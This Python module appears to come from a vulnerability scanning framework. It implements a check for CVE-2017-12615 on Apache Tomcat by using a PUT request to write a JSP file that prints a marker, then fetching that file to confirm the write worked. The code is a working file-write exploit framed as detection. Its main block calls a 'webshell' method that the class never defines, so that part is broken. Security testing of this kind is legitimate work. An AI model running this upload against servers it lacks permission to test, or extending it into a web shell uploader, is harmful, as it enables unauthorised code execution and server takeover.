#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class CVE_2017_12615_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2017-12615',
            'description': 'Tomcat Arbitrary File Writer Vulnerability, 受影响版本: Apache Tomcat 7.0.0 to 7.0.79',
            'date': '2017-09-19',
            'exptype': 'check',
            'type': 'Arbitrary File Writer'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.osname = 'Unknown'
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent(),
        }
        self.check_payload = '''<%out.print("{check}");%>'''.format(check = self.capta)
    
    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_req = await request.put(self.url + "/%s.jsp/" %(self.capta), data = self.check_payload, headers = self.headers)
            get_check_req = await request.get(self.url + "/%s.jsp" %(self.capta), headers = self.headers)
            get_check_req_result = await get_check_req.text()
            if get_check_req.status == 200 and self.capta in get_check_req_result.strip():
                return True
        except Exception as e:
            # print(e)
            pass
        
if  __name__ == "__main__":
    CVE_2017_12615 = CVE_2017_12615_BaseVerify('http://127.0.0.1:8080')
    print(CVE_2017_12615.webshell('tesy'))


